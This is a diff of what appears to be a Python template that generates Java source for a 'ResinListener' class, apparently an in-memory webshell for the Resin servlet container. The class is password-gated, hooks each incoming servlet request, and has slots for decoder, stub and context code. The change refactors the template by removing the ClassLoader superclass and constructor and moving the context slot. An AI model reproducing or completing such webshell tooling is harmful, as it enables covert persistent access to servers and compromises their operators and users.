@@ -2,13 +2,13 @@ code = """
 import java.lang.reflect.*;
 import java.util.*;
 
-public class ResinListener extends ClassLoader implements InvocationHandler {{
+public class ResinListener implements InvocationHandler {{
     private static String password = "{password}";
     private static boolean initialized = false;
 {common}
+{context}
 {decoder}
 {stub}
-{context}
     private void hook(Object servletRequestEvent) throws Exception {{
         Object servletRequest = invokeMethod(
             servletRequestEvent, "getServletRequest"
@@ -62,10 +62,6 @@ public class ResinListener extends ClassLoader implements InvocationHandler {{
                 }} catch (Exception e) {{}}
             }}
         }}
-    }}
-
-    public ResinListener(ClassLoader loader) {{
-        super(loader);
     }}
 
     static {{
